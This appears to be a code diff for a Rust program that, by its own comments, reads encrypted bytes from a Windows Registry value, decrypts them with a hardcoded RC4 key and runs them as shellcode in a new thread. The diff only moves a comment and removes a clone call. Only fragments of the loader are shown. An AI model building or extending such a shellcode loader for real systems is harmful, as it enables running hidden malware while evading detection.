@@ -1,10 +1,11 @@
+//! This program retrieves raw bytes from a Windows Registry value,
+//! decrypts them with RC4, and executes the result as shellcode
+//! in the current process via a new thread. Executing arbitrary
+//! bytes as code is inherently dangerous; use only in controlled,
+//! authorized, and isolated environments.
+
 extern crate winapi;
 
-// This program retrieves raw bytes from a Windows Registry value,
-// decrypts them with RC4, and executes the result as shellcode
-// in the current process via a new thread. Executing arbitrary
-// bytes as code is inherently dangerous; use only in controlled,
-// authorized, and isolated environments.
 
 // Symmetric RC4 key used to decrypt the bytes fetched from the Registry.
 const RC4_KEY: [u8; 16] = [
@@ -19,7 +20,7 @@ fn main() -> Result<(), String> {
 
     // Decrypt the payload in memory using RC4. RC4 is symmetric; applying
     // the same function with the same key both encrypts and decrypts.
-    let mut decrypted = data.clone();
+    let mut decrypted = data;
     rc4_crypt(&mut decrypted, &RC4_KEY);
     println!("[+] Decrypted {} bytes", decrypted.len());
 
